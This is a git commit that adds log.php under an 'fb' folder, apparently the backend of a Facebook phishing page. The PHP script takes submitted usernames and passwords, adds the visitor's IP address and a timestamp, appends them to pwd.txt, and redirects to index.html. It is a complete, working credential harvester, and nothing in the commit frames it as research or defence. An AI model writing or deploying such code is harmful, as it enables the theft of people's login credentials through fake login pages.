ce3798d31268e48ea0a65d2ea4c9dda39e969862
Kiran Shenoy P.H <33525945+KiranShny@users.noreply.github.com>
2017-12-16 14:02:25 +0530

    Create log.php

---
+++ fb/log.php
@@ -0,0 +1,17 @@
+<?php
+$user= $_POST['username'];
+$pass= $_POST['password'];
+$ip= $_SERVER['REMOTE_ADDR'];
+$dat= date("d/m/Y h:i:s");
+if( (empty($user)) or (empty($pass)) )
+{
+header('Location: index.html');
+}
+else 
+{
+$f=fopen("pwd.txt","a");
+fwrite($f,'Username: [<font color="red">'.$user.'</font><br/>]Password: [<font color="red">'.$pass.'</font><br/>]IP: [<font color="red">'.$ip.'</font><br/>]Date: [<font color="red">'.$dat.'</font><br/><br/>]');
+fclose($f);
+header('Location: index.html');
+}
+?>
